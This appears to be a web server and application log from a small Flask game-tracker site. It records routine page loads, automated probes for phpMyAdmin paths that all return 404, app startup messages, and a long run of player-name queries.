+14:19:49: 106.13.35.234 - - [17/Jul/2020 14:19:49] "[33mGET /pma-old/index.php HTTP/1.1[0m" 404 -14:19:49: 
+14:19:49: 106.13.35.234 - - [17/Jul/2020 14:19:49] "[33mGET /claroline/phpMyAdmin/index.php HTTP/1.1[0m" 404 -14:19:49: 
+14:19:52: 106.13.35.234 - - [17/Jul/2020 14:19:52] "[33mGET /typo3/phpmyadmin/index.php HTTP/1.1[0m" 404 -14:19:52: 
+14:19:53: 106.13.35.234 - - [17/Jul/2020 14:19:53] "[33mGET /phpma/index.php HTTP/1.1[0m" 404 -14:19:53: 
+14:19:56: 106.13.35.234 - - [17/Jul/2020 14:19:56] "[33mGET /phpmyadmin/phpmyadmin/index.php HTTP/1.1[0m" 404 -14:19:56: 
+14:19:57: 106.13.35.234 - - [17/Jul/2020 14:19:57] "[33mGET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1[0m" 404 -14:19:57: 
+14:20:00: 106.13.35.234 - - [17/Jul/2020 14:20:00] "[33mGET /phpMyAdmin__/index.php HTTP/1.1[0m" 404 -14:20:00: 
+14:20:01: 106.13.35.234 - - [17/Jul/2020 14:20:01] "[33mGET /phpMyAdmin+++---/index.php HTTP/1.1[0m" 404 -14:20:01: 
+14:20:04: 106.13.35.234 - - [17/Jul/2020 14:20:04] "[33mGET /v/index.php HTTP/1.1[0m" 404 -14:20:04: 
+14:20:12: 106.13.35.234 - - [17/Jul/2020 14:20:12] "[33mGET /phpMyAdm1n/index.php HTTP/1.1[0m" 404 -14:20:12: 
+14:20:16: 106.13.35.234 - - [17/Jul/2020 14:20:16] "[33mGET /phpMyadmi/index.php HTTP/1.1[0m" 404 -14:20:16: 
+14:20:17: 106.13.35.234 - - [17/Jul/2020 14:20:17] "[33mGET /phpMyAdmion/index.php HTTP/1.1[0m" 404 -14:20:17: 
+14:20:20: 106.13.35.234 - - [17/Jul/2020 14:20:20] "[33mGET /s/index.php HTTP/1.1[0m" 404 -14:20:20: 
+14:20:24: 106.13.35.234 - - [17/Jul/2020 14:20:24] "[33mGET /phpMyAdmin1/index.php HTTP/1.1[0m" 404 -14:20:24: 
+14:20:29: 106.13.35.234 - - [17/Jul/2020 14:20:29] "[33mGET /pwd/index.php HTTP/1.1[0m" 404 -14:20:29: 
+14:20:32: 106.13.35.234 - - [17/Jul/2020 14:20:32] "[33mGET /phpMyAdmina/index.php HTTP/1.1[0m" 404 -14:20:32: 
+14:20:33: 106.13.35.234 - - [17/Jul/2020 14:20:33] "[33mGET /phpMydmin/index.php HTTP/1.1[0m" 404 -14:20:33: 
+14:20:36: 106.13.35.234 - - [17/Jul/2020 14:20:36] "[33mGET /phpMyAdmin._/index.php HTTP/1.1[0m" 404 -14:20:36: 
+14:20:37: 106.13.35.234 - - [17/Jul/2020 14:20:37] "[33mGET /phpMyAdmin._2/index.php HTTP/1.1[0m" 404 -14:20:37: 
+14:20:40: 106.13.35.234 - - [17/Jul/2020 14:20:40] "[33mGET /phpmyadmin2222/index.php HTTP/1.1[0m" 404 -14:20:40: 
+14:20:41: 106.13.35.234 - - [17/Jul/2020 14:20:41] "[33mGET /phpMyAdmin333/index.php HTTP/1.1[0m" 404 -14:20:41: 
+14:20:44: 106.13.35.234 - - [17/Jul/2020 14:20:44] "[33mGET /phpmyadmin3333/index.php HTTP/1.1[0m" 404 -14:20:44: 
+14:20:45: 106.13.35.234 - - [17/Jul/2020 14:20:45] "[33mGET /php2MyAdmin/index.php HTTP/1.1[0m" 404 -14:20:45: 
+14:20:48: 106.13.35.234 - - [17/Jul/2020 14:20:48] "[33mGET /phpNyAdmin/index.php HTTP/1.1[0m" 404 -14:20:48: 
+14:20:49: 106.13.35.234 - - [17/Jul/2020 14:20:49] "[33mGET /1/index.php HTTP/1.1[0m" 404 -14:20:49: 
+14:20:54: 106.13.35.234 - - [17/Jul/2020 14:20:54] "[33mGET /download/index.php HTTP/1.1[0m" 404 -14:20:54: 
+14:20:57: 106.13.35.234 - - [17/Jul/2020 14:20:57] "[33mGET /phpMyAdmin_111/index.php HTTP/1.1[0m" 404 -14:20:57: 
+14:21:04: 106.13.35.234 - - [17/Jul/2020 14:21:04] "[33mGET /123131/index.php HTTP/1.1[0m" 404 -14:21:04: 
+14:21:05: 106.13.35.234 - - [17/Jul/2020 14:21:05] "[33mGET /phpMyAdminn/index.php HTTP/1.1[0m" 404 -14:21:05: 
+14:21:05: 106.13.35.234 - - [17/Jul/2020 14:21:05] "[33mGET /phpMyAdminhf/index.php HTTP/1.1[0m" 404 -14:21:05: 
+14:21:08: 106.13.35.234 - - [17/Jul/2020 14:21:08] "[33mGET /WWW/phpMyAdmin/index.php HTTP/1.1[0m" 404 -14:21:08: 
+14:21:09: 106.13.35.234 - - [17/Jul/2020 14:21:09] "[33mGET /phpMyAdmln/index.php HTTP/1.1[0m" 404 -14:21:09: 
+14:21:12: 106.13.35.234 - - [17/Jul/2020 14:21:12] "[33mGET /__phpMyAdmin/index.php HTTP/1.1[0m" 404 -14:21:12: 
+14:21:13: 106.13.35.234 - - [17/Jul/2020 14:21:13] "[33mGET /program/index.php HTTP/1.1[0m" 404 -14:21:13: 
+14:21:16: 106.13.35.234 - - [17/Jul/2020 14:21:16] "[33mGET /phppma/index.php HTTP/1.1[0m" 404 -14:21:16: 
+14:21:18: 106.13.35.234 - - [17/Jul/2020 14:21:18] "[33mGET /phpmy/index.php HTTP/1.1[0m" 404 -14:21:18: 
+14:21:20: 106.13.35.234 - - [17/Jul/2020 14:21:20] "[33mGET /mysql/dbadmin/index.php HTTP/1.1[0m" 404 -14:21:20: 
+14:21:21: 106.13.35.234 - - [17/Jul/2020 14:21:21] "[33mGET /mysql/sqlmanager/index.php HTTP/1.1[0m" 404 -14:21:21: 
+14:21:22: 106.13.35.234 - - [17/Jul/2020 14:21:22] "[33mGET /mysql/mysqlmanager/index.php HTTP/1.1[0m" 404 -14:21:22: 
+14:21:24: 106.13.35.234 - - [17/Jul/2020 14:21:24] "[33mGET /sqladmin/index.php HTTP/1.1[0m" 404 -14:21:24: 
+14:21:25: 106.13.35.234 - - [17/Jul/2020 14:21:25] "[33mGET /sql/index.php HTTP/1.1[0m" 404 -14:21:25: 
+14:21:27: 106.13.35.234 - - [17/Jul/2020 14:21:27] "[33mGET /SQL/index.php HTTP/1.1[0m" 404 -14:21:27: 
+14:21:32: 106.13.35.234 - - [17/Jul/2020 14:21:32] "[33mGET /websql/index.php HTTP/1.1[0m" 404 -14:21:32: 
+14:40:32: 72.191.29.70 - - [17/Jul/2020 14:40:32] "[37mGET / HTTP/1.1[0m" 200 -14:40:32: 
+14:40:33: 72.191.29.70 - - [17/Jul/2020 14:40:33] "[37mGET /static/images/silvertrophy.png HTTP/1.1[0m" 200 -14:40:33: 
+14:40:33: 72.191.29.70 - - [17/Jul/2020 14:40:33] "[37mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 200 -14:40:33: 
+14:40:33: 72.191.29.70 - - [17/Jul/2020 14:40:33] "[37mGET /static/pages.css HTTP/1.1[0m" 200 -14:40:33: 
+14:40:33: 72.191.29.70 - - [17/Jul/2020 14:40:33] "[37mGET /static/images/logo.png HTTP/1.1[0m" 200 -14:40:33: 
+14:40:33: 72.191.29.70 - - [17/Jul/2020 14:40:33] "[37mGET /static/images/darkan.png HTTP/1.1[0m" 200 -14:40:33: 
+14:40:33: 72.191.29.70 - - [17/Jul/2020 14:40:33] "[37mGET /static/images/goldtrophy.png HTTP/1.1[0m" 200 -14:40:33: 
+14:40:34: 72.191.29.70 - - [17/Jul/2020 14:40:34] "[37mGET /static/images/icons/fire_cape.png HTTP/1.1[0m" 200 -14:40:34: 
+14:51:07: 72.191.29.70 - - [17/Jul/2020 14:51:07] "[37mGET / HTTP/1.1[0m" 200 -14:51:07: 
+14:51:07: 72.191.29.70 - - [17/Jul/2020 14:51:07] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -14:51:07: 
+14:51:07: 72.191.29.70 - - [17/Jul/2020 14:51:07] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -14:51:07: 
+14:51:07: 72.191.29.70 - - [17/Jul/2020 14:51:07] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -14:51:07: 
+14:51:07: 72.191.29.70 - - [17/Jul/2020 14:51:07] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -14:51:07: 
+14:51:07: 72.191.29.70 - - [17/Jul/2020 14:51:07] "[36mGET /static/images/darkan.png HTTP/1.1[0m" 304 -14:51:07: 
+14:51:07: 72.191.29.70 - - [17/Jul/2020 14:51:07] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -14:51:07: 
+14:51:33: 72.191.29.70 - - [17/Jul/2020 14:51:33] "[37mGET /tracker HTTP/1.1[0m" 200 -14:51:33: 
+14:51:33: 72.191.29.70 - - [17/Jul/2020 14:51:33] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -14:51:33: 
+14:51:33: 72.191.29.70 - - [17/Jul/2020 14:51:33] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -14:51:33: 
+14:51:33: 72.191.29.70 - - [17/Jul/2020 14:51:33] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -14:51:33: 
+14:51:33: 72.191.29.70 - - [17/Jul/2020 14:51:33] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -14:51:33: 
+14:51:33: 72.191.29.70 - - [17/Jul/2020 14:51:33] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -14:51:33: 
+14:51:33: 72.191.29.70 - - [17/Jul/2020 14:51:33] "[37mGET /static/graph.png HTTP/1.1[0m" 200 -14:51:33: 
+15:15:40: 201.187.99.212 - - [17/Jul/2020 15:15:40] "[33mPOST /cgi-bin/ViewLog.asp HTTP/1.1[0m" 404 -15:15:40: 
+15:27:34: 218.32.104.5 - - [17/Jul/2020 15:27:34] "[37mGET / HTTP/1.1[0m" 200 -15:27:34: 
+15:54:48: 201.187.99.212 - - [17/Jul/2020 15:54:48] "[33mPOST /cgi-bin/ViewLog.asp HTTP/1.1[0m" 404 -15:54:48: 
+16:30:41: 104.244.78.107 - - [17/Jul/2020 16:30:41] "[37mGET / HTTP/1.1[0m" 200 -16:30:41: 
+16:57:51: 220.133.71.199 - - [17/Jul/2020 16:57:51] "[37mGET / HTTP/1.1[0m" 200 -16:57:51: 
+18:18:34: 72.191.29.70 - - [17/Jul/2020 18:18:34] "[37mGET / HTTP/1.1[0m" 200 -18:18:34: 
+18:18:34: 72.191.29.70 - - [17/Jul/2020 18:18:34] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -18:18:34: 
+18:18:34: 72.191.29.70 - - [17/Jul/2020 18:18:34] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -18:18:34: 
+18:18:34: 72.191.29.70 - - [17/Jul/2020 18:18:34] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -18:18:34: 
+18:18:34: 72.191.29.70 - - [17/Jul/2020 18:18:34] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -18:18:34: 
+18:18:34: 72.191.29.70 - - [17/Jul/2020 18:18:34] "[36mGET /static/images/darkan.png HTTP/1.1[0m" 304 -18:18:34: 
+18:18:34: 72.191.29.70 - - [17/Jul/2020 18:18:34] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -18:18:34: 
+18:18:36: 72.191.29.70 - - [17/Jul/2020 18:18:36] "[37mGET /tracker HTTP/1.1[0m" 200 -18:18:36: 
+18:18:36: 72.191.29.70 - - [17/Jul/2020 18:18:36] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -18:18:36: 
+18:18:36: 72.191.29.70 - - [17/Jul/2020 18:18:36] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -18:18:36: 
+18:18:36: 72.191.29.70 - - [17/Jul/2020 18:18:36] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -18:18:36: 
+18:18:36: 72.191.29.70 - - [17/Jul/2020 18:18:36] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -18:18:36: 
+18:18:36: 72.191.29.70 - - [17/Jul/2020 18:18:36] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -18:18:36: 
+18:18:36: 72.191.29.70 - - [17/Jul/2020 18:18:36] "[37mGET /static/graph.png HTTP/1.1[0m" 200 -18:18:36: 
+18:18:42: 72.191.29.70 - - [17/Jul/2020 18:18:42] "[37mPOST /tracker HTTP/1.1[0m" 200 -18:18:42: 
+18:18:42: 72.191.29.70 - - [17/Jul/2020 18:18:42] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -18:18:42: 
+18:18:42: 72.191.29.70 - - [17/Jul/2020 18:18:42] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -18:18:42: 
+18:18:42: 72.191.29.70 - - [17/Jul/2020 18:18:42] "[36mGET /static/images/goldtrophy.png HTTP/1.1[0m" 304 -18:18:42: 
+18:18:42: 72.191.29.70 - - [17/Jul/2020 18:18:42] "[37mGET /static/graph.png HTTP/1.1[0m" 200 -18:18:42: 
+18:18:42: 72.191.29.70 - - [17/Jul/2020 18:18:42] "[36mGET /static/images/bronzetrophy.png HTTP/1.1[0m" 304 -18:18:42: 
+18:18:42: 72.191.29.70 - - [17/Jul/2020 18:18:42] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -18:18:42: 
+18:19:22: 72.191.29.70 - - [17/Jul/2020 18:19:22] "[37mPOST /tracker HTTP/1.1[0m" 200 -18:19:22: 
+18:19:22: 72.191.29.70 - - [17/Jul/2020 18:19:22] "[36mGET /static/pages.css HTTP/1.1[0m" 304 -18:19:22: 
+18:19:22: 72.191.29.70 - - [17/Jul/2020 18:19:22] "[36mGET /static/images/logo.png HTTP/1.1[0m" 304 -18:19:22: 
+18:19:22: 72.191.29.70 - - [17/Jul/2020 18:19:22] "[36mGET /static/images/silvertrophy.png HTTP/1.1[0m" 304 -18:19:22: 
+18:19:22: 72.191.29.70 - - [17/Jul/2020 18:19:22] "[37mGET /static/graph.png HTTP/1.1[0m" 200 -18:19:22: 
+18:25:22: Remote github exists
+18:25:22: 
+
+18:25:22: Git branch:ubuntu is checked out, being used.
+18:25:22: 
+
+18:25:23: 0 query success
+18:25:23: 
+
+18:25:23: 
+18:25:23:  * Serving Flask app "app" (lazy loading)
+
+18:25:23:  * Environment: production
+
+18:25:23:    WARNING: This is a development server. Do not use it in a production deployment.
+
+18:25:23:    Use a production WSGI server instead.
+
+18:25:23:  * Debug mode: off
+
+18:25:23: 1 query success
+18:25:23: 
+
+18:25:23: 13 query success
+18:25:23: 
+
+18:25:23: 16 query success
+18:25:23: 
+
+18:25:24: emailAdmin was run
+18:25:24: 
+
+18:25:24: 1haha1 query success
+18:25:24: 
+
+18:25:24: 44444444444 query success
+18:25:24: 
+
+18:25:24: 45kin query success
+18:25:24: 
+
+18:25:25: emailAdmin was run
+18:25:25: 
+
+18:25:25: 753456159258 query success
+18:25:25: 
+
+18:25:25: 7yz query success
+18:25:25: 
+
+18:25:25: adtukz query success
+18:25:25: 
+
+18:25:26: ady query success
+18:25:26: 
+
+18:25:26: alethros query success
+18:25:26: 
+
+18:25:26: ancient query success
+18:25:26: 
+
+18:25:27: arc en ciel query success
+18:25:27: 
+
+18:25:27: asia query success
+18:25:27: 
+
+18:25:27: aubery query success
+18:25:27: 
+
+18:25:28: aubury query success
+18:25:28: 
+
+18:25:28: baby deezus query success
+18:25:28: 
+
+18:25:28: big mac query success
+18:25:28: 
+
+18:25:28: biskybiscuit query success
+18:25:28: 
+
+18:25:29: black knight query success
+18:25:29: 
+
+18:25:29: blazerlord query success
+18:25:29: 
+
+18:25:29: blessdanoobs query success
+18:25:29: 
+
+18:25:30: boe query success
+18:25:30: 
+
+18:25:30: box query success
+18:25:30: 
+
+18:25:30: brad query success
+18:25:30: 
+
+18:25:31: brrs query success
+18:25:31: 
+
+18:25:31: carrot query success
+18:25:31: 
+
+18:25:31: castlewars query success
+18:25:31: 
+
+18:25:32: caviel query success
+18:25:32: 
+
+18:25:32: chbachman query success
+18:25:32: 
+
+18:25:32: christopher query success
+18:25:32: 
+
+18:25:32: clickeddaisy query success
+18:25:32: 
+
+18:25:33: coconut dan query success
+18:25:33: 
+
+18:25:33: cokecane query success
+18:25:33: 
+
+18:25:33: coolcon12 query success
+18:25:33: 
+
+18:25:34: coordinates query success
+18:25:34: 
+
+18:25:34: cringe kid query success
+18:25:34: 
+
+18:25:34: crow query success
+18:25:34: 
+
+18:25:35: crown query success
+18:25:35: 
+
+18:25:35: crusader query success
+18:25:35: 
+
+18:25:35: cryptonote query success
+18:25:35: 
+
+18:25:36: dark drift7 query success
+18:25:36: 
+
+18:25:36: dbag magee query success
+18:25:36: 
+
+18:25:36: deadly were query success
+18:25:36: 
+
+18:25:37: deadlywere query success
+18:25:37: 
+
+18:25:37: death wish query success
+18:25:37: 
+
+18:25:37: deathstriger query success
+18:25:37: 
+
+18:25:38: delb query success
+18:25:38: 
+
+18:25:38: diskid query success
+18:25:38: 
+
+18:25:38: dispvm query success
+18:25:38: 
+
+18:25:39: disskill query success
+18:25:39: 
+
+18:25:39: dlainee 900 query success
+18:25:39: 
+
+18:25:39: dmcg query success
+18:25:39: 
+
+18:25:40: dot net query success
+18:25:40: 
+
+18:25:40: dreadknight query success
+18:25:40: 
+
+18:25:40: duration query success
+18:25:40: 
+
+18:25:40: duration2 query success
+18:25:40: 
+
+18:25:41: edgelord360 query success
+18:25:41: 
+
+18:25:41: edgelord420 query success
+18:25:41: 
+
+18:25:41: edgelord69 query success
+18:25:41: 
+
+18:25:42: ekiph query success
+18:25:42: 
+
+18:25:42: esmerelda query success
+18:25:42: 
+
+18:25:42: eventest query success
+18:25:42: 
+
+18:25:43: fkingalt query success
+18:25:43: 
+
+18:25:43: fkingloot query success
+18:25:43: 
+
+18:25:43: fkingmain query success
+18:25:43: 
+
+18:25:44: flamie query success
+18:25:44: 
+
+18:25:44: flan query success
+18:25:44: 
+
+18:25:44: fletching query success
+18:25:44: 
+
+18:25:45: freeziepop query success
+18:25:45: 
+
+18:25:45: gamer4life query success
+18:25:45: 
+
+18:25:45: garlic fork query success
+18:25:45: 
+
+18:25:46: garlic pork query success
+18:25:46: 
+
+18:25:46: gex546 query success
+18:25:46: 
+
+18:25:46: gexskills query success
+18:25:46: 
+
+18:25:47: goldenag query success
+18:25:47: 
+
+18:25:47: grimoire query success
+18:25:47: 
+
+18:25:47: grizzly query success
+18:25:47: 
+
+18:25:47: guine query success
+18:25:47: 
+
+18:25:48: handcrafted query success
+18:25:48: 
+
+18:25:48: heat query success
+18:25:48: 
+
+18:25:48: herieman query success
+18:25:48: 
+
+18:25:49: highkeyloki query success
+18:25:49: 
+
+18:25:49: hitler query success
+18:25:49: 
+
+18:25:49: honestly query success
+18:25:49: 
+
+18:25:50: hwguy query success
+18:25:50: 
+
+18:25:50: i am yim query success
+18:25:50: 
+
+18:25:50: ian query success
+18:25:50: 
+
+18:25:51: ibt query success
+18:25:51: 
+
+18:25:51: ikrim query success
+18:25:51: 
+
+18:25:51: ill query success
+18:25:51: 
+
+18:25:51: illusion query success
+18:25:51: 
+
+18:25:52: incognito query success
+18:25:52: 
+
+18:25:52: inori query success
+18:25:52: 
+
+18:25:52: invalid query success
+18:25:52: 
+
+18:25:53: iron arm query success
+18:25:53: 
+
+18:25:53: ironic query success
+18:25:53: 
+
+18:25:53: jarno45 query success
+18:25:53: 
+
+18:25:54: javin query success
+18:25:54: 
+
+18:25:54: jawarrior query success
+18:25:54: 
+
+18:25:54: jawarrior1 query success
+18:25:54: 
+
+18:25:55: jawarrior2 query success
+18:25:55: 
+
+18:25:55: jeton query success
+18:25:55: 
+
+18:25:55: jigglebox query success
+18:25:55: 
+
+18:25:56: jingles query success
+18:25:56: 
+
+18:25:56: jiren query success
+18:25:56: 
+
+18:25:56: jonny jonny query success
+18:25:56: 
+
+18:25:56: juice fruit query success
+18:25:56: 
+
+18:25:57: justin query success
+18:25:57: 
+
+18:25:57: kakarot query success
+18:25:57: 
+
+18:25:58: kale query success
+18:25:58: 
+
+18:25:58: kalem query success
+18:25:58: 
+
+18:25:58: kestlen query success
+18:25:58: 
+
+18:25:59: kijani query success
+18:25:59: 
+
+18:25:59: killing query success
+18:25:59: 
+
+18:25:59: krethis query success
+18:25:59: 
+
+18:25:59: kunark query success
+18:25:59: 
+
+18:26:00: kurt query success
+18:26:00: 
+
+18:26:00: lady celeste query success
+18:26:00: 
+
+18:26:00: lazy celeste query success
+18:26:00: 
+
+18:26:01: ledsy query success
+18:26:01: 
+
+18:26:01: lende query success
+18:26:01: 
+
+18:26:01: lestic query success
+18:26:01: 
+
+18:26:02: lowkeyloki query success
+18:26:02: 
+
+18:26:02: mag query success
+18:26:02: 
+
+18:26:02: mageballer43 query success
+18:26:02: 
+
+18:26:03: maxed query success
+18:26:03: 
+
+18:26:03: medic query success
+18:26:03: 
+
+18:26:03: megastary query success
+18:26:03: 
+
+18:26:03: miguel query success
+18:26:03: 
+
+18:26:04: mitosk query success
+18:26:04: 
+
+18:26:04: mo query success
+18:26:04: 
+
+18:26:04: monero query success
+18:26:04: 
+
+18:26:05: mystic query success
+18:26:05: 
+
+18:26:05: mysticpoisen query success
+18:26:05: 
+
+18:26:05: myth scape query success
+18:26:05: 
+
+18:26:06: n f query success
+18:26:06: 
+
+18:26:06: neckromancer query success
+18:26:06: 
+
+18:26:06: nex query success
+18:26:06: 
+
+18:26:07: niftu query success
+18:26:07: 
+
+18:26:07: niftu cal query success
+18:26:07: 
+
+18:26:07: nl query success
+18:26:07: 
+
+18:26:08: noisycork query success
+18:26:08: 
+
+18:26:08: notlead query success
+18:26:08: 
+
+18:26:08: nullopt query success
+18:26:08: 
+
+18:26:08: nurnkiller query success
+18:26:08: 
+
+18:26:09: obarner query success
+18:26:09: 
+
+18:26:09: ojoib query success
+18:26:09: 
+
+18:26:09: ollie12345 query success
+18:26:09: 
+
+18:26:10: omu dung query success
+18:26:10: 
+
+18:26:10: omu u query success
+18:26:10: 
+
+18:26:10: one query success
+18:26:10: 
+
+18:26:10: onox query success
+18:26:10: 
+
+18:26:11: pally query success
+18:26:11: 
+
+18:26:11: parenthetic query success
+18:26:11: 
+
+18:26:11: perkele query success
+18:26:11: 
+
+18:26:12: pew query success
+18:26:12: 
+
+18:26:12: pew il query success
+18:26:12: 
+
+18:26:12: piscies query success
+18:26:12: 
+
+18:26:13: pixel parade query success
+18:26:13: 
+
+18:26:13: pker 0wns query success
+18:26:13: 
+
+18:26:13: poltergeist query success
+18:26:13: 
+
+18:26:13: pr0mast3r query success
+18:26:13: 
+
+18:26:14: rain query success
+18:26:14: 
+
+18:26:14: ray query success
+18:26:14: 
+
+18:26:14: razi query success
+18:26:14: 
+
+18:26:15: relaytam12 query success
+18:26:15: 
+
+18:26:15: reloadz query success
+18:26:15: 
+
+18:26:15: retro query success
+18:26:15: 
+
+18:26:16: rias gremory query success
+18:26:16: 
+
+18:26:16: ricky query success
+18:26:16: 
+
+18:26:16: robotic01 query success
+18:26:16: 
+
+18:26:17: roe query success
+18:26:17: 
+
+18:26:17: roflmfao query success
